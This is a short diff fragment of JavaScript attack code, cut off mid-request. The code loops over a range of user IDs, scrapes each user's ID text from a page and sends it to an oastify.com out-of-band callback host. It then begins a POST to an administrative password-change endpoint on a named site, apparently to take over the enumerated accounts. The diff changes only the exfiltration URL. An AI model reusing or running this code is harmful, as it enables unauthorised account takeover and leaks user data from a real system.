@@ -4,7 +4,7 @@ for (let i = 199200; i <= 199299; i++) {
     .then(res => {
       let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
       if (match) {
-        fetch(`https://a2du46mpuqca25k6relyc6fn2e85wvkk.oastify.com?data=${encodeURIComponent(match[1])}`);
+        fetch(`1mog1ow5kzp7jzj7c6udt7ayjppgd61v.oastify.com?data=${encodeURIComponent(match[1])}`);
       }
       return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
         method: "POST",
